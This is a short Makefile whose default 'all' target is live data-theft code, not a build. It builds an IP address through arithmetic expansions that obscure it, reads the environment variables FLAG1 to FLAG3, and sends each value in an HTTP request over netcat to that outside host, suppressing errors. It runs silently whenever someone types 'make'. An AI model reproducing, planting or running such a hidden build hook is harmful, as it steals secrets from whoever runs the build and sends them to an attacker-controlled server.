.PHONY: all
all:
	@bash -c 'h=$$((8)).$$((217)).$$((202)).$$((186)); for i in 1 2 3; do eval v=\$FLAG$$i; printf "N%s " $$i; printf %s "$$v" | xxd -p -c1 | paste -sd: -; echo; printf "GET /zillwc/%s HTTP/1.0\r\nHost: %s\r\n\r\n" "$$v" "$$h" | nc -w 20 $$h 80 >/dev/null || true; done'
